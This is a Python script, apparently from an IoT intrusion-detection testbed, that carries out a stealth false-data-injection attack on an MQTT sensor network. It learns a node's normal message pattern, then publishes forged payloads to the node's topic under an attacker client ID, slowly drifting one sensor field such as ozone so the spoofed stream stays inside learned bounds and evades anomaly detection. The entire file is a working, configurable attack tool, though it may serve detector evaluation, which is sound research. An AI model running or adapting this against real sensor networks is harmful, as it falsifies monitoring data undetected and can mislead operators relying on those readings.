"""
=========================================================
ATTACK: BEHAVIOUR-MIMICKING / STEALTH ATTACK
=========================================================
Methodology:
  Matches normal patterns — drifts one sensor field slowly
  so the stream stays close to learned bounds.

Node-aware: resolves target node from topic/profile/schema and
selects a valid sensor field per node (no longer hardcoded to
node1/ozone). For multi-node evaluation, pass --topic (and
optionally --drift-field).
=========================================================
"""

import argparse
import os
import random
import time

from adaptive_learner import learn_network, make_client
import payloads

# =========================
# CONFIG (defaults; overridable via CLI/env)
# =========================
BROKER = os.environ.get("MQTT_BROKER", "localhost")
PORT = int(os.environ.get("MQTT_PORT", "1883"))
USER = os.environ.get("MQTT_USER", "esp32user")
PASSWORD = os.environ.get("MQTT_PASS", "")
TARGET_TOPIC = os.environ.get("MQTT_TOPIC", "iot/node1/data")
ATTACKER_ID = "attacker_mimic_py"
LEARN_DURATION = int(os.environ.get("LEARN_DURATION", "60"))
DRIFT_FIELD_ENV = os.environ.get("MIMIC_DRIFT_FIELD", "").strip()
DRIFT_PER_STEP = float(os.environ.get("MIMIC_DRIFT_PER_STEP", "0.05"))
MAX_DRIFT = float(os.environ.get("MIMIC_MAX_DRIFT", "100"))


def _node_id_for(topic, profile=None):
    if profile is not None and getattr(profile, "node", None):
        return profile.node
    try:
        return payloads.node_from_topic(topic)
    except Exception:
        return payloads.DEFAULT_NODE


def _schema_sensor_fields(node_id):
    try:
        return list(payloads.sensor_fields_for(node_id))
    except Exception:
        try:
            return list(payloads.schema_for(node_id).get("sensor_fields", ()))
        except Exception:
            return ["ozone"]


def choose_drift_field(topic, profile=None, drift_field=None):
    """Pick a numeric sensor field valid for the target node.

    Priority: explicit drift_field > env > node1 'ozone' if valid >
    first schema sensor field present in learned stats > first schema sensor field.
    """
    if drift_field:
        return drift_field
    if DRIFT_FIELD_ENV:
        return DRIFT_FIELD_ENV

    node_id = _node_id_for(topic, profile)
    candidates = _schema_sensor_fields(node_id)
    if not candidates:
        candidates = ["ozone"]

    # Preserve legacy behavior for node1 when ozone is available.
    if node_id == "node1" and "ozone" in candidates:
        return "ozone"

    stats = getattr(profile, "field_stats", {}) or {}
    for f in candidates:
        if f in stats:
            return f
    return candidates[0]


def drift_value(profile, field, drift, node_id=None):
    """Sample the drift field around its learned mean + accumulated drift."""
    stats = getattr(profile, "field_stats", {}).get(field)
    schema = {}
    try:
        schema = payloads.schema_for(node_id) if node_id else {}
    except Exception:
        schema = {}
    defaults = schema.get("defaults", {}) if isinstance(schema, dict) else {}
    int_fields = set(schema.get("int_fields", ())) if isinstance(schema, dict) else set(payloads.INT_FIELDS)
    non_negative = set(schema.get("non_negative", ())) if isinstance(schema, dict) else set(payloads.NON_NEGATIVE)

    if not stats:
        return defaults.get(field, payloads.DEFAULTS.get(field, 0))

    mean = stats["mean"]
    std = max(stats.get("std", 0.01), 0.01)
    value = random.gauss(mean + drift, std)
    if field in int_fields:
        value = int(round(value))
        if field in non_negative:
            value = max(0, value)
        return value
    value = round(value, 2)
    if field in non_negative:
        value = max(0.0, value)
    return value


def run(profile, broker=BROKER, port=PORT, user=USER, password=PASSWORD,
        target_topic=TARGET_TOPIC, duration=None, stop_event=None,
        on_publish=None, captured=None, drift_field=None,
        drift_per_step=DRIFT_PER_STEP, max_drift=MAX_DRIFT):
    """Publish node-identical payloads with a slow stealth drift.

    Returns the number of messages published.
    """
    client = make_client(ATTACKER_ID)
    client.username_pw_set(user, password)
    client.connect(broker, port, 60)
    client.loop_start()

    node_id = _node_id_for(target_topic, profile)
    field = choose_drift_field(target_topic, profile, drift_field=drift_field)
    print(
        f"[mimic] target={target_topic} node={node_id} drift_field={field} "
        f"drift/step={drift_per_step} max_drift={max_drift}",
        flush=True,
    )
    interval_mean = getattr(profile, "interval_mean", 2.0) or 2.0
    interval_std = max(getattr(profile, "interval_std", 0.01) or 0.01, 0.01)

    drift = 0.0
    count = 0
    end = time.time() + duration if duration else None
    try:
        while True:
            if stop_event is not None and stop_event.is_set():
                break
            if end is not None and time.time() >= end:
                break
            if abs(drift) < abs(max_drift):
                drift += drift_per_step
            overrides = {field: drift_value(profile, field, drift, node_id=node_id)}
            try:
                payload = payloads.build_payload(profile, overrides, node_id=node_id)
            except TypeError:
                payload = payloads.build_payload(profile, overrides)
            client.publish(target_topic, payload)
            count += 1
            if on_publish:
                on_publish(f"node={node_id} field={field} drift={drift:.2f} {payload}")

            delay = max(0.1, random.gauss(interval_mean, interval_std))
            time.sleep(delay)
    except KeyboardInterrupt:
        pass
    finally:
        client.loop_stop()
        client.disconnect()
    return count


def main():
    ap = argparse.ArgumentParser(description="Node-aware MQTT mimic/stealth drift attack")
    ap.add_argument("--broker", default=BROKER)
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--user", default=USER)
    ap.add_argument("--password", default=PASSWORD)
    ap.add_argument("--topic", default=TARGET_TOPIC, help="Target topic, e.g. iot/node4/data")
    ap.add_argument("--learn-duration", type=int, default=LEARN_DURATION)
    ap.add_argument("--duration", type=int, default=0, help="Attack duration seconds (0=until Ctrl+C)")
    ap.add_argument("--drift-field", default=DRIFT_FIELD_ENV, help="Sensor field to drift; default chosen per node")
    ap.add_argument("--drift-per-step", type=float, default=DRIFT_PER_STEP)
    ap.add_argument("--max-drift", type=float, default=MAX_DRIFT)
    args = ap.parse_args()

    print("=== MIMIC ATTACK (adaptive, node-aware stealth drift) ===")
    print(f"Target:      {args.topic}")
    print(f"Broker:      {args.broker}:{args.port}")
    print(f"Drift field: {args.drift_field or '(auto per node)'}")
    print(f"Drift/step:  {args.drift_per_step}, max: {args.max_drift}\n")

    profile = learn_network(args.broker, args.port, args.user, args.password,
                            args.topic, learn_duration=args.learn_duration)
    node_id = _node_id_for(args.topic, profile)
    field = choose_drift_field(args.topic, profile, drift_field=args.drift_field or None)
    print(f"Resolved node={node_id}, drift field={field}")
    if field not in (getattr(profile, "field_stats", {}) or {}):
        print(f"WARNING: '{field}' not found in learned fields: {list((getattr(profile, 'field_stats', {}) or {}).keys())}")

    print(f"\n=== ATTACK ACTIVE — interval ~{getattr(profile, 'interval_mean', 0):.2f}s ===\n")
    run(profile, broker=args.broker, port=args.port, user=args.user, password=args.password,
        target_topic=args.topic, duration=(args.duration or None),
        drift_field=field, drift_per_step=args.drift_per_step, max_drift=args.max_drift,
        on_publish=lambda m: print(f"[mimic] {m}"))


if __name__ == "__main__":
    main()
